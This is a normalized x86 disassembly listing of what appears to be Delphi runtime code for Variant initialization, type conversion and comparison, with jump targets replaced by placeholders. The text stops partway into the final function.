fld [ eax ]
add esp 0xfffffff4
fstp [ esp ]
fwait
lea eax [ ebp - 0x48 ]
call sub_409844
mov edx [ ebp - 0x48 ]
mov eax esi
call sub_40476c
jmp r-xdata
mov eax [ ebx + 0x8 ]
fld [ eax ]
add esp 0xfffffff4
fstp [ esp ]
fwait
lea eax [ ebp - 0x4c ]
call sub_409844
mov edx [ ebp - 0x4c ]
mov eax esi
call sub_40476c
jmp r-xdata
mov eax [ ebx + 0x8 ]
push [ eax + 0x4 ]
push [ eax ]
lea eax [ ebp - 0x50 ]
call sub_41209c
mov edx [ ebp - 0x50 ]
mov eax esi
call sub_40465c
jmp r-xdata
mov eax [ ebx + 0x8 ]
push [ eax + 0x4 ]
push [ eax ]
lea eax [ ebp - 0x54 ]
call sub_4120d4
mov edx [ ebp - 0x54 ]
mov eax esi
call sub_40465c
jmp r-xdata
mov eax esi
mov edx [ ebx + 0x8 ]
mov edx [ edx ]
call sub_404730
jmp r-xdata
lea edx [ ebp - 0x58 ]
mov eax [ ebx + 0x8 ]
mov ax [ eax ]
call sub_41210c
mov edx [ ebp - 0x58 ]
mov eax esi
call sub_40465c
jmp r-xdata
lea edx [ ebp - 0x5c ]
mov eax [ ebx + 0x8 ]
movsx eax [ eax ]
call sub_408388
mov edx [ ebp - 0x5c ]
mov eax esi
call sub_40476c
jmp r-xdata
lea edx [ ebp - 0x60 ]
mov eax [ ebx + 0x8 ]
movzx eax [ eax ]
call sub_408388
mov edx [ ebp - 0x60 ]
mov eax esi
call sub_40476c
jmp r-xdata
lea edx [ ebp - 0x64 ]
mov eax [ ebx + 0x8 ]
movzx eax [ eax ]
call sub_408388
mov edx [ ebp - 0x64 ]
mov eax esi
call sub_40476c
jmp r-xdata
mov eax [ ebx + 0x8 ]
mov eax [ eax ]
xor edx edx
push edx
push eax
lea eax [ ebp - 0x68 ]
call sub_408474
mov edx [ ebp - 0x68 ]
mov eax esi
call sub_40476c
jmp r-xdata
mov eax [ ebx + 0x8 ]
push [ eax + 0x4 ]
push [ eax ]
lea eax [ ebp - 0x6c ]
call sub_408474
mov edx [ ebp - 0x6c ]
mov eax esi
call sub_40476c
jmp r-xdata
mov eax [ ebx + 0x8 ]
mov edx eax
mov eax esi
call sub_412aac
jmp r-xdata
sub_41300c
push ebp
mov ebp esp
add esp 0xfffffff0
push ebx
push esi
mov esi edx
mov ebx eax
lea eax [ ebp - 0x10 ]
push eax
call VariantInit
xor eax eax
push ebp
push sub_413076
push [ fs : eax ]
mov [ fs : eax ] esp
mov edx esi
lea eax [ ebp - 0x10 ]
call sub_40f3bc
lea eax [ ebp - 0x10 ]
call [ rw-data ]
cmp [ ebp - 0x10 ] 0xd
je r-xdata
mov eax ebx
mov edx [ ebp - 0x8 ]
call sub_4058e8
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_41307d
lea eax [ ebp - 0x10 ]
call sub_40f094
retn
mov dx 0xd
mov ax 0x101
call sub_40e85c
sub_413084
push ebx
push esi
push ecx
mov ebx edx
mov esi eax
movzx eax [ ebx ]
cmp eax 0xd
jg r-xdata
sub eax 0x101
je r-xdata
je r-xdata
mov edx ebx
mov eax esi
call sub_41300c
jmp r-xdata
sub eax 0x3f08
je r-xdata
mov eax esi
mov edx [ ebx + 0x8 ]
call sub_4058e8
jmp r-xdata
sub eax 0x1
jb r-xdata
pop edx
pop esi
pop ebx
retn
mov eax esi
mov edx [ ebx + 0x8 ]
mov edx [ edx ]
call sub_4058e8
jmp r-xdata
sub eax 0x4
je r-xdata
mov eax esi
call sub_4058d0
jmp r-xdata
je r-xdata
jmp r-xdata
cmp [ rw-data ] 0x0
je r-xdata
sub eax 0x8
je r-xdata
mov edx esp
mov ax [ ebx ]
call sub_414478
test al al
je r-xdata
mov eax esi
call sub_4058d0
jmp r-xdata
mov dx 0xd
mov ax 0x1
call sub_40e85c
jmp r-xdata
mov ax [ ebx ]
mov dx 0xd
call sub_40e85c
mov eax esi
call sub_4058d0
mov ecx eax
mov edx r-xdata
mov eax [ esp ]
call sub_403220
test al al
jne r-xdata
sub_413150
push ebx
push esi
push ecx
mov ebx edx
mov esi eax
mov ax [ ebx ]
sub ax 0x1
jb r-xdata
mov eax esi
call sub_4058d0
jmp r-xdata
je r-xdata
pop edx
pop esi
pop ebx
retn
cmp [ rw-data ] 0x0
je r-xdata
sub ax 0x8
je r-xdata
mov eax esi
call sub_4058d0
jmp r-xdata
mov dx 0x9
mov ax 0x1
call sub_40e85c
mov eax esi
mov edx [ ebx + 0x8 ]
call sub_4058e8
jmp r-xdata
sub ax 0x4000
je r-xdata
mov eax esi
mov edx [ ebx + 0x8 ]
mov edx [ edx ]
call sub_4058e8
jmp r-xdata
jmp r-xdata
mov edx esp
mov ax [ ebx ]
call sub_414478
test al al
je r-xdata
mov ax [ ebx ]
mov dx 0x9
call sub_40e85c
mov eax esi
call sub_4058d0
mov ecx eax
mov edx r-xdata
mov eax [ esp ]
call sub_403220
test al al
jne r-xdata
sub_4131fc
push ebx
push esi
push edi
mov ebx ecx
mov esi edx
mov edi eax
test [ edi ] 0xbfe8
je r-xdata
cmp [ rw-data ] 0x0
je r-xdata
mov eax edi
call sub_40f018
mov [ edi ] 0x3
movsx eax bl
mov ax [ eax * 2 + rw-data ]
mov [ edi ] ax
jmp r-xdata
mov [ edi + 0x8 ] esi
pop edi
pop esi
pop ebx
retn
sub_413238
push ebx
push esi
mov esi edx
mov ebx eax
test [ ebx ] 0xbfe8
je r-xdata
mov [ ebx ] 0x3
mov [ ebx + 0x8 ] esi
pop esi
pop ebx
retn
mov eax ebx
call sub_40f018
sub_413258
push ebx
push esi
mov ebx edx
mov esi eax
test [ esi ] 0xbfe8
je r-xdata
mov [ esi ] 0x11
mov [ esi + 0x8 ] bl
pop esi
pop ebx
retn
mov eax esi
call sub_40f018
sub_413278
push ebx
push esi
mov esi edx
mov ebx eax
test [ ebx ] 0xbfe8
je r-xdata
mov [ ebx ] 0x12
mov [ ebx + 0x8 ] si
pop esi
pop ebx
retn
mov eax ebx
call sub_40f018
sub_413298
push ebx
push esi
mov esi edx
mov ebx eax
test [ ebx ] 0xbfe8
je r-xdata
mov [ ebx ] 0x13
mov [ ebx + 0x8 ] esi
pop esi
pop ebx
retn
mov eax ebx
call sub_40f018
sub_4132b8
push ebx
push esi
mov ebx edx
mov esi eax
test [ esi ] 0xbfe8
je r-xdata
mov [ esi ] 0x10
mov [ esi + 0x8 ] bl
pop esi
pop ebx
retn
mov eax esi
call sub_40f018
sub_4132d8
push ebx
push esi
mov esi edx
mov ebx eax
test [ ebx ] 0xbfe8
je r-xdata
mov [ ebx ] 0x2
mov [ ebx + 0x8 ] si
pop esi
pop ebx
retn
mov eax ebx
call sub_40f018
sub_4132f8
push ebp
mov ebp esp
push ebx
mov ebx eax
test [ ebx ] 0xbfe8
je r-xdata
mov [ ebx ] 0x14
mov eax [ ebp + 0x8 ]
mov [ ebx + 0x8 ] eax
mov eax [ ebp + 0xc ]
mov [ ebx + 0xc ] eax
pop ebx
pop ebp
retn 0x8
mov eax ebx
call sub_40f018
sub_413324
push ebp
mov ebp esp
push ebx
mov ebx eax
test [ ebx ] 0xbfe8
je r-xdata
mov eax [ ebp + 0x8 ]
mov [ ebx + 0x8 ] eax
mov [ ebx ] 0x4
pop ebx
pop ebp
retn 0x4
mov eax ebx
call sub_40f018
sub_413348
push ebp
mov ebp esp
push ebx
mov ebx eax
test [ ebx ] 0xbfe8
je r-xdata
mov eax [ ebp + 0x8 ]
mov [ ebx + 0x8 ] eax
mov eax [ ebp + 0xc ]
mov [ ebx + 0xc ] eax
mov [ ebx ] 0x5
pop ebx
pop ebp
retn 0x8
mov eax ebx
call sub_40f018
sub_413374
push ebp
mov ebp esp
push ebx
mov ebx eax
test [ ebx ] 0xbfe8
je r-xdata
mov eax [ ebp + 0x8 ]
mov [ ebx + 0x8 ] eax
mov eax [ ebp + 0xc ]
mov [ ebx + 0xc ] eax
mov [ ebx ] 0x6
pop ebx
pop ebp
retn 0x8
mov eax ebx
call sub_40f018
sub_4133a0
push ebp
mov ebp esp
push ebx
mov ebx eax
test [ ebx ] 0xbfe8
je r-xdata
mov eax [ ebp + 0x8 ]
mov [ ebx + 0x8 ] eax
mov eax [ ebp + 0xc ]
mov [ ebx + 0xc ] eax
mov [ ebx ] 0x7
pop ebx
pop ebp
retn 0x8
mov eax ebx
call sub_40f018
sub_4133cc
push ebx
push esi
mov ebx edx
mov esi eax
test [ esi ] 0xbfe8
je r-xdata
mov [ esi ] 0xb
cmp bl 0x1
cmc
sbb eax eax
mov [ esi + 0x8 ] ax
pop esi
pop ebx
retn
mov eax esi
call sub_40f018
sub_413430
push ebx
push esi
mov esi edx
mov ebx eax
test [ ebx ] 0xbfe8
je r-xdata
xor eax eax
mov [ ebx + 0x8 ] eax
mov [ ebx ] 0x100
lea eax [ ebx + 0x8 ]
mov edx esi
call sub_403f94
pop esi
pop ebx
retn
mov eax ebx
call sub_40f018
sub_41345c
push ebx
push esi
mov esi edx
mov ebx eax
test [ ebx ] 0xbfe8
je r-xdata
xor eax eax
mov [ ebx + 0x8 ] eax
mov [ ebx ] 0x8
lea eax [ ebx + 0x8 ]
push eax
mov ecx 0x7fffffff
mov edx 0x1
mov eax esi
call sub_40481c
pop esi
pop ebx
retn
mov eax ebx
call sub_40f018
sub_413494
push ebx
push esi
mov esi edx
mov ebx eax
test [ ebx ] 0xbfe8
je r-xdata
xor eax eax
mov [ ebx + 0x8 ] eax
mov [ ebx ] 0xd
lea eax [ ebx + 0x8 ]
mov edx esi
call sub_4058e8
pop esi
pop ebx
retn
mov eax ebx
call sub_40f018
sub_4134c0
push ebx
push esi
mov esi edx
mov ebx eax
test [ ebx ] 0xbfe8
je r-xdata
xor eax eax
mov [ ebx + 0x8 ] eax
mov [ ebx ] 0x9
lea eax [ ebx + 0x8 ]
mov edx esi
call sub_4058e8
pop esi
pop ebx
retn
mov eax ebx
call sub_40f018
sub_4134ec
push ebx
mov ebx eax
and bx 0xfff
cmp bx 0x14
jbe r-xdata
mov eax ebx
pop ebx
retn
cmp bx 0x100
jne r-xdata
call sub_40e8f8
mov bx 0x8
jmp r-xdata
sub_413510
push ebp
mov ebp esp
add esp 0xffffffdc
push ebx
push esi
push edi
mov edi ecx
mov ebx edx
mov esi eax
lea eax [ ebp - 0x11 ]
push eax
call VariantInit
xor eax eax
push ebp
push sub_4135d3
push [ fs : eax ]
mov [ fs : eax ] esp
mov edx esi
lea eax [ ebp - 0x11 ]
call sub_40f3bc
cmp [ esi ] 0x101
jne r-xdata
cmp [ ebx ] 0x101
jne r-xdata
lea eax [ ebp - 0x11 ]
call [ rw-data ]
mov edx ebx
lea eax [ ebp - 0x11 ]
mov ecx edi
call sub_413dc4
mov [ ebp - 0x1 ] al
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_4135da
lea eax [ ebp - 0x11 ]
call sub_40f094
retn
lea eax [ ebp - 0x21 ]
push eax
call VariantInit
xor eax eax
push ebp
push sub_4135a7
push [ fs : eax ]
mov [ fs : eax ] esp
mov edx ebx
lea eax [ ebp - 0x21 ]
call sub_40f3bc
lea eax [ ebp - 0x21 ]
call [ rw-data ]
lea edx [ ebp - 0x21 ]
lea eax [ ebp - 0x11 ]
mov ecx edi
call sub_413dc4
mov [ ebp - 0x1 ] al
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push r-xdata
lea eax [ ebp - 0x21 ]
call sub_40f094
retn
sub_4135f8
push ebx
push ecx
mov [ esp ] dl
mov bl 0x1
mov edx ecx
sub edx 0xe
je r-xdata
mov dl [ rw-data ]
sub dl 0x1
jb r-xdata
dec edx
je r-xdata
call sub_40e94c
jmp r-xdata
je r-xdata
mov dl [ rw-data ]
sub dl 0x1
jb r-xdata
dec edx
sub edx 0x4
jb r-xdata
mov eax ebx
pop edx
pop ebx
retn
mov bl [ rw-data ]
jmp r-xdata
dec dl
je r-xdata
call sub_40e94c
jmp r-xdata
je r-xdata
mov dl [ rw-data ]
sub dl 0x1
jb r-xdata
jmp r-xdata
cmp al 0x2
jne r-xdata
jmp r-xdata
mov bl [ rw-data ]
jmp r-xdata
dec dl
je r-xdata
call sub_40e94c
jmp r-xdata
je r-xdata
call sub_40e8f8
xor eax eax
jmp r-xdata
cmp [ esp ] 0x2
je r-xdata
cmp al 0x2
jne r-xdata
jmp r-xdata
mov bl [ ecx * 2 + rw-data ]
jmp r-xdata
dec dl
je r-xdata
and eax 0x7f
mov bl [ eax + rw-data ]
jmp r-xdata
mov al 0x1
mov al 0x1
cmp [ esp ] 0x2
jne r-xdata
cmp al 0x2
jne r-xdata
jmp r-xdata
xor eax eax
jmp r-xdata
mov bl 0x2
jmp r-xdata
cmp [ esp ] 0x2
jne r-xdata
and eax 0x7f
mov bl [ eax + rw-data ]
jmp r-xdata
xor ebx ebx
jmp r-xdata
mov bl 0x1
jmp r-xdata
sub_4136f4
push ebp
mov ebp esp
mov eax [ ebp + 0x10 ]
mov edx [ ebp + 0x14 ]
cmp edx [ ebp + 0xc ]
jne r-xdata
jge r-xdata
cmp eax [ ebp + 0x8 ]
jae r-xdata
mov eax [ ebp + 0x10 ]
mov edx [ ebp + 0x14 ]
cmp edx [ ebp + 0xc ]
jne r-xdata
xor eax eax
jmp r-xdata
jmp r-xdata
jle r-xdata
cmp eax [ ebp + 0x8 ]
jbe r-xdata
pop ebp
retn 0x10
mov al 0x1
mov al 0x2
jmp r-xdata
jmp r-xdata
sub_413730
push ebp
mov ebp esp
fld [ ebp + 0x10 ]
fcomp [ ebp + 0x8 ]
fnstsw ax
sahf
jae r-xdata
fld [ ebp + 0x10 ]
fcomp [ ebp + 0x8 ]
fnstsw ax
sahf
jbe r-xdata
xor eax eax
jmp r-xdata
mov al 0x1
mov al 0x2
jmp r-xdata
pop ebp
retn 0x10
sub_413758
push ebp
mov ebp esp
fld [ ebp + 0x10 ]
fcomp [ ebp + 0x8 ]
fnstsw ax
sahf
jae r-xdata
fld [ ebp + 0x10 ]
fcomp [ ebp + 0x8 ]
fnstsw ax
sahf
jbe r-xdata
xor eax eax
jmp r-xdata
mov al 0x1
mov al 0x2
jmp r-xdata
pop ebp
retn 0x10
sub_413780
push ebp
mov ebp esp
fild [ ebp + 0x10 ]
fild [ ebp + 0x8 ]
fcompp
fnstsw ax
sahf
jbe r-xdata
fild [ ebp + 0x10 ]
fild [ ebp + 0x8 ]
fcompp
fnstsw ax
sahf
jae r-xdata
xor eax eax
jmp r-xdata
mov al 0x1
mov al 0x2
jmp r-xdata
pop ebp
retn 0x10
sub_4137ac
push ebp
mov ebp esp
push 0x0
push 0x0
push ebx
mov ebx edx
xor edx edx
push ebp
push sub_413807
push [ fs : edx ]
mov [ fs : edx ] esp
mov edx eax
lea eax [ ebp - 0x4 ]
call sub_412384
mov edx ebx
lea eax [ ebp - 0x8 ]
call sub_412384
mov edx [ ebp - 0x8 ]
mov eax [ ebp - 0x4 ]
call sub_407f48
xor edx edx
call sub_4136e0
mov ebx eax
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_41380e
lea eax [ ebp - 0x8 ]
mov edx 0x2
call sub_403f64
retn
sub_413818
push ebx
push esi
push edi
push ebp
mov ebp ecx
mov edi edx
mov esi eax
mov ax [ esi ]
call sub_4134ec
movzx eax ax
mov bl [ eax + rw-data ]
mov ax [ edi ]
call sub_4134ec
movzx eax ax
mov al [ eax + rw-data ]
xor edx edx
mov dl al
xor ecx ecx
mov cl bl
imul ecx ecx 0xb
add ecx rw-data
movzx edx [ ecx + edx ]
cmp edx 0xa
ja r-xdata
call sub_40e8f8
mov al 0x1
jmp [ edx * 4 + jump_table_413869 ]
call sub_40e8f8
mov al 0x1
jmp r-xdata
mov edx eax
mov eax ebx
call sub_4135e4
jmp r-xdata
mov ecx ebp
mov edx eax
mov eax ebx
call sub_4135f8
jmp r-xdata
mov eax edi
call sub_40fa4c
push eax
mov eax esi
call sub_40fa4c
pop edx
call sub_4136e0
jmp r-xdata
mov eax esi
call sub_410510
push edx
push eax
mov eax edi
call sub_410510
push edx
push eax
call sub_4136f4
jmp r-xdata
mov eax esi
call sub_411014
add esp 0xfffffff8
fstp [ esp ]
fwait
mov eax edi
call sub_411014
add esp 0xfffffff8
fstp [ esp ]
fwait
call sub_413730
jmp r-xdata
mov eax esi
call sub_411768
add esp 0xfffffff8
fstp [ esp ]
fwait
mov eax edi
call sub_411768
add esp 0xfffffff8
fstp [ esp ]
fwait
call sub_413758
jmp r-xdata
mov eax esi
call sub_411cd0
add esp 0xfffffff8
fistp [ esp ]
fwait
mov eax edi
call sub_411cd0
add esp 0xfffffff8
fistp [ esp ]
fwait
call sub_413780
jmp r-xdata
mov edx edi
mov eax esi
call sub_4137ac
jmp r-xdata
mov eax edi
call sub_410b0c
and eax 0x7f
push eax
mov eax esi
call sub_410b0c
and eax 0x7f
pop edx
call sub_4136e0
jmp r-xdata
mov edx edi
mov eax esi
mov ecx ebp
call sub_413510
jmp r-xdata
pop ebp
pop edi
pop esi
pop ebx
retn
sub_4139a4
push ebp
mov ebp esp
add esp 0xffffffd8
push ebx
push esi
mov [ ebp - 0x8 ] ecx
mov [ ebp - 0x4 ] edx
mov ebx eax
mov [ ebp - 0x9 ] 0x1
mov si [ ebx ]
mov eax esi
and ax 0xfff
cmp ax 0x10f
jae r-xdata
mov eax [ ebp - 0x4 ]
mov ax [ eax ]
test ax ax
jne r-xdata
test si si
jne r-xdata
mov edx [ ebp - 0x4 ]
cmp ax 0x1
jne r-xdata
mov dl 0x1
xor eax eax
call sub_4135e4
mov [ ebp - 0x9 ] al
jmp r-xdata
cmp si 0x1
jne r-xdata
xor edx edx
mov al 0x1
call sub_4135e4
mov [ ebp - 0x9 ] al
jmp r-xdata
lea edx [ ebp - 0x14 ]
mov eax esi
call sub_414478
test al al
jne r-xdata
mov ecx [ ebp - 0x8 ]
mov dl 0x2
xor eax eax
call sub_4135f8
mov [ ebp - 0x9 ] al
jmp r-xdata
mov al [ ebp - 0x9 ]
pop esi
pop ebx
mov esp ebp
pop ebp
retn
lea edx [ ebp - 0x18 ]
mov eax [ ebp - 0x4 ]
mov ax [ eax ]
call sub_414478
test al al
jne r-xdata
mov ecx [ ebp - 0x8 ]
xor edx edx
mov al 0x2
call sub_4135f8
mov [ ebp - 0x9 ] al
jmp r-xdata
lea eax [ ebp - 0xe ]
push eax
mov edx [ ebp - 0x4 ]
mov ecx 0xb
mov eax [ ebp - 0x14 ]
mov esi [ eax ]
call [ esi + 0x8 ]
test al al
je r-xdata
call sub_40e8f8
jmp r-xdata
lea eax [ ebp - 0xc ]
push eax
mov edx ebx
mov ecx 0xb
mov eax [ ebp - 0x18 ]
mov esi [ eax ]
call [ esi + 0x4 ]
test al al
je r-xdata
call sub_40e8f8
jmp r-xdata
mov esi [ ebp - 0x4 ]
mov si [ esi ]
mov eax esi
and ax 0xfff
cmp ax 0x10f
jae r-xdata
mov eax [ ebp - 0x4 ]
mov ax [ eax ]
cmp ax [ ebp - 0xe ]
je r-xdata
lea eax [ ebp - 0x28 ]
push eax
call VariantInit
xor eax eax
push ebp
push sub_413b3d
push [ fs : eax ]
mov [ fs : eax ] esp
movzx ecx [ ebx ]
mov edx [ ebp - 0x4 ]
lea eax [ ebp - 0x28 ]
call sub_40f688
mov ax [ ebp - 0x28 ]
and ax 0xfff
cmp ax [ ebx ]
je r-xdata
mov ax [ ebx ]
cmp ax [ ebp - 0xc ]
je r-xdata
lea edx [ ebp - 0x18 ]
mov eax [ ebp - 0x4 ]
mov eax esi
call sub_414478
test al al
jne r-xdata
lea eax [ ebp - 0x28 ]
push eax
call VariantInit
xor eax eax
push ebp
push sub_413ccf
push [ fs : eax ]
mov [ fs : eax ] esp
mov ecx [ ebp - 0x4 ]
movzx ecx [ ecx ]
mov edx ebx
lea eax [ ebp - 0x28 ]
call sub_40f688
mov eax [ ebp - 0x4 ]
mov ax [ eax ]
cmp ax [ ebp - 0x28 ]
je r-xdata
mov eax [ ebp - 0x8 ]
push eax
mov ecx [ ebp - 0x4 ]
mov edx ebx
mov eax [ ebp - 0x14 ]
mov ebx [ eax ]
call [ ebx + 0x34 ]
and eax 0x7f
mov edx [ ebp - 0x8 ]
lea edx [ edx * 2 + rw-data ]
mov al [ edx + eax - 0x1c ]
mov [ ebp - 0x9 ] al
jmp r-xdata
lea eax [ ebp - 0x28 ]
push eax
call VariantInit
xor eax eax
push ebp
push sub_413c2d
push [ fs : eax ]
mov [ fs : eax ] esp
movzx ecx [ ebp - 0xe ]
mov edx [ ebp - 0x4 ]
lea eax [ ebp - 0x28 ]
call sub_40f688
mov ax [ ebp - 0x28 ]
cmp ax [ ebp - 0xe ]
je r-xdata
lea edx [ ebp - 0x28 ]
mov eax ebx
mov ecx [ ebp - 0x8 ]
call sub_413818
mov [ ebp - 0x9 ] al
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push r-xdata
lea eax [ ebp - 0x28 ]
call sub_40f094
retn
call sub_40e808
mov eax [ ebp - 0x8 ]
push eax
mov ecx [ ebp - 0x4 ]
mov edx ebx
mov eax [ ebp - 0x18 ]
mov ebx [ eax ]
call [ ebx + 0x34 ]
and eax 0x7f
mov edx [ ebp - 0x8 ]
lea edx [ edx * 2 + rw-data ]
mov al [ edx + eax - 0x1c ]
mov [ ebp - 0x9 ] al
jmp r-xdata
lea eax [ ebp - 0x28 ]
push eax
call VariantInit
xor eax eax
push ebp
push sub_413aaf
push [ fs : eax ]
mov [ fs : eax ] esp
movzx ecx [ ebp - 0xc ]
mov edx ebx
lea eax [ ebp - 0x28 ]
call sub_40f688
mov ax [ ebp - 0x28 ]
and ax 0xfff
cmp ax [ ebp - 0xc ]
je r-xdata
lea eax [ ebp - 0xc ]
push eax
mov edx ebx
mov ecx 0xb
mov eax [ ebp - 0x18 ]
mov esi [ eax ]
call [ esi + 0x4 ]
test al al
je r-xdata
call sub_40e8f8
jmp r-xdata
mov edx [ ebp - 0x4 ]
lea eax [ ebp - 0x28 ]
mov ecx [ ebp - 0x8 ]
call sub_413818
mov [ ebp - 0x9 ] al
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push r-xdata
lea eax [ ebp - 0x28 ]
call sub_40f094
retn
call sub_40e808
mov eax [ ebp - 0x8 ]
push eax
lea ecx [ ebp - 0x28 ]
mov edx ebx
mov eax [ ebp - 0x14 ]
mov ebx [ eax ]
call [ ebx + 0x34 ]
and eax 0x7f
mov edx [ ebp - 0x8 ]
lea edx [ edx * 2 + rw-data ]
mov al [ edx + eax - 0x1c ]
mov [ ebp - 0x9 ] al
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push r-xdata
lea eax [ ebp - 0x28 ]
call sub_40f094
retn
call sub_40e808
mov eax [ ebp - 0x8 ]
push eax
mov ecx [ ebp - 0x4 ]
lea edx [ ebp - 0x28 ]
mov eax [ ebp - 0x18 ]
mov ebx [ eax ]
call [ ebx + 0x34 ]
and eax 0x7f
mov edx [ ebp - 0x8 ]
lea edx [ edx * 2 + rw-data ]
mov al [ edx + eax - 0x1c ]
mov [ ebp - 0x9 ] al
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push r-xdata
lea eax [ ebp - 0x28 ]
call sub_40f094
retn
call sub_40e808
call sub_40e8f8
mov ax [ ebx ]
cmp ax [ ebp - 0xc ]
je r-xdata
mov eax [ ebp - 0x8 ]
push eax
mov ecx [ ebp - 0x4 ]
mov edx ebx
mov eax [ ebp - 0x18 ]
mov ebx [ eax ]
call [ ebx + 0x34 ]
and eax 0x7f
mov edx [ ebp - 0x8 ]
lea edx [ edx * 2 + rw-data ]
mov al [ edx + eax - 0x1c ]
mov [ ebp - 0x9 ] al
jmp r-xdata
lea eax [ ebp - 0x28 ]
push eax
call VariantInit
xor eax eax
push ebp
push sub_413d85
push [ fs : eax ]
mov [ fs : eax ] esp
movzx ecx [ ebp - 0xc ]
mov edx ebx
lea eax [ ebp - 0x28 ]
call sub_40f688
mov ax [ ebp - 0x28 ]
cmp ax [ ebp - 0xc ]
je r-xdata
mov eax [ ebp - 0x8 ]
push eax
mov ecx [ ebp - 0x4 ]
lea edx [ ebp - 0x28 ]
mov eax [ ebp - 0x18 ]
mov ebx [ eax ]
call [ ebx + 0x34 ]
and eax 0x7f
mov edx [ ebp - 0x8 ]
lea edx [ edx * 2 + rw-data ]
mov al [ edx + eax - 0x1c ]
mov [ ebp - 0x9 ] al
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push r-xdata
lea eax [ ebp - 0x28 ]
call sub_40f094
retn
call sub_40e808
sub_413dc4
push esi
push edi
mov si [ eax ]
mov di [ edx ]
cmp si 0x10f
jae r-xdata
cmp si 0x400c
jne r-xdata
cmp di 0x10f
jae r-xdata
cmp di 0x400c
jne r-xdata
mov eax [ eax + 0x8 ]
call sub_413dc4
jmp r-xdata
call sub_413818
pop edi
pop esi
retn
and si 0xfff
cmp si 0x10f
jae r-xdata
mov edx [ edx + 0x8 ]
call sub_413dc4
jmp r-xdata
pop edi
pop esi
retn
call sub_4139a4
and di 0xfff
cmp di 0x10f
jae r-xdata
call sub_413818
jmp r-xdata
sub_413fb0
push ebp
mov ebp esp
add esp 0xfffffdf8
push ebx
push esi
push edi
xor ecx ecx
mov [ ebp - 0x208 ] ecx
mov esi edx
mov ebx eax
xor eax eax
push ebp
push sub_4140d6
push [ fs : eax ]
mov [ fs : eax ] esp
mov edi ebx
and di 0xfff
cmp di 0x14
ja r-xdata
cmp bx 0x100
jne r-xdata
mov eax esi
movzx edx di
mov edx [ edx * 4 + rw-data ]
call sub_403f94
jmp r-xdata
cmp bx 0x101
jne r-xdata
mov eax esi
mov edx r-xdata
call sub_403f94
jmp r-xdata
test bh 0x20
je r-xdata
lea edx [ ebp - 0x4 ]
mov eax ebx
call sub_414478
test al al
je r-xdata
mov eax esi
mov edx r-xdata
call sub_403f94
jmp r-xdata
test bh 0x40
je r-xdata
mov ecx [ esi ]
mov eax esi
mov edx r-xdata
call sub_40424c
lea ecx [ ebp - 0x208 ]
movzx eax di
mov edx 0x4
call sub_40849c
mov ecx [ ebp - 0x208 ]
mov edx [ rw-data ]
mov edx [ edx ]
mov eax esi
call sub_40424c
lea eax [ ebp - 0x104 ]
push eax
lea edx [ ebp - 0x204 ]
mov eax [ ebp - 0x4 ]
mov eax [ eax ]
call sub_4030bc
lea eax [ ebp - 0x204 ]
mov ecx 0x7fffffff
mov edx 0x2
call sub_402874
lea edx [ ebp - 0x104 ]
mov eax esi
call sub_4041a4
jmp r-xdata
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_4140dd
lea eax [ ebp - 0x208 ]
call sub_403f40
retn
mov ecx [ esi ]
mov eax esi
mov edx r-xdata
call sub_40424c
sub_4141c4
push [ edx + 0x56080040 ]
popad
jb r-xdata
idiv dh
popad
outsb
je r-xdata
add [ eax ] eax
add [ ebp - 0x3e ] bl
add al 0x0
push ebx
push esi
push edi
push ecx
mov esi ecx
mov edi edx
mov ebx eax
mov edx esp
mov ax [ esi ]
call sub_414478
test al al
je r-xdata
mov eax eax
mov eax ebx
call sub_4143f8
mov ax [ ebx + 0x4 ]
push eax
mov ecx esi
mov edx edi
mov eax [ esp + 0x4 ]
mov ebx [ eax ]
call [ ebx + 0x1c ]
jmp r-xdata
pop edx
pop edi
pop esi
pop ebx
retn
sub_4141d4
push ebp
mov ebp esp
push ebx
push esi
mov esi rw-data
push rw-data
call EnterCriticalSection
xor edx edx
push ebp
push sub_414235
push [ fs : edx ]
mov [ fs : edx ] esp
mov eax [ esi ]
call sub_404f68
mov ebx eax
dec ebx
cmp ebx 0x0
jl r-xdata
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_41423c
push rw-data
call LeaveCriticalSection
retn
mov eax [ esi ]
mov eax [ eax + ebx * 4 ]
cmp eax [ rw-data ]
je r-xdata
dec ebx
cmp ebx 0xffffffff
jne r-xdata
call sub_40316c
sub_414284
push ebp
mov ebp esp
add esp 0xfffffff8
push ebx
push esi
push edi
mov esi ecx
mov [ ebp - 0x4 ] edx
mov ebx eax
mov edi [ ebp + 0x8 ]
cmp di [ ebx + 0x4 ]
je r-xdata
mov eax ebx
call sub_4143f8
lea edx [ ebp - 0x8 ]
mov ax [ esi ]
call sub_414478
test al al
je r-xdata
push edi
mov ecx esi
mov edx [ ebp - 0x4 ]
mov eax [ ebp - 0x8 ]
mov ebx [ eax ]
call [ ebx + 0x1c ]
jmp r-xdata
pop edi
pop esi
pop ebx
pop ecx
pop ecx
pop ebp
retn 0x4
sub_4142d8
push ebp
mov ebp esp
push ecx
push ebx
push esi
push edi
mov edi edx
mov esi eax
lea eax [ ebp - 0x1 ]
push eax
mov edx edi
mov eax esi
mov ebx [ eax ]
call [ ebx + 0x38 ]
xor eax eax
mov al [ ebp - 0x1 ]
mov edx [ ebp + 0x8 ]
lea edx [ edx + edx * 2 ]
add edx rw-data
mov al [ edx + eax - 0x2a ]
pop edi
pop esi
pop ebx
pop ecx
pop ebp
retn 0x4
sub_414310
push ebx
push esi
push edi
push ebp
push ecx
mov esi ecx
mov edi edx
mov ebx eax
mov ecx esp
mov edx esi
mov eax ebx
mov ebp [ eax ]
call [ ebp + 0xc ]
test al al
je r-xdata
mov eax ebx
call sub_4143f8
mov ax [ esp ]
push eax
mov ecx esi
mov edx edi
mov eax ebx
mov ebx [ eax ]
call [ ebx + 0x1c ]
jmp r-xdata
pop edx
pop ebp
pop edi
pop esi
pop ebx
retn
sub_41434c
push ebp
mov ebp esp
